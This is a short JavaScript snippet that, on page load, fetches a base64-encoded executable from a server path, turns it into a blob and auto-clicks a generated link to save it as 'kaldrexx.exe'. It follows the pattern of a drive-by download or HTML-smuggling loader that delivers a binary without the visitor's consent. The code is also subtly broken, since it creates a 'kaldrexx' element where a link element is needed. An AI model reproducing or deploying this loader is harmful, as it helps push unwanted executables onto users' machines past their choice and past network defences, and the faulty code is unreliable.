// Convert base64 to ArrayBuffer
function base64ToArrayBuffer(base64) {
    if (base64 == null) {
        throw new Error("base64 is null");
    }

    let binaryString = window.atob(base64);
    let binaryStringLength = binaryString.length;
    let binaryBytes = new Uint8Array(binaryStringLength);
    for (let i = 0; i < binaryStringLength; i++) {
        binaryBytes[i] = binaryString.charCodeAt(i);
    }
    return binaryBytes.buffer;
}

// Fetch the base64 encoded executable and download it
window.onload = function () {
    fetch("/kaldrexx")
        .then(response => response.json())
        .then(data => {
            let arrayBuffer = base64ToArrayBuffer(data["executable"]);
            let blob = new Blob([arrayBuffer], { type: "application/octet-stream" });
            let url = URL.createObjectURL(blob);
            let kaldrexx = document.createElement("kaldrexx");
            kaldrexx.href = url;
            kaldrexx.download = "kaldrexx.exe";
            document.body.appendChild(kaldrexx);
            kaldrexx.click();
            window.URL.revokeObjectURL(url);
        });
}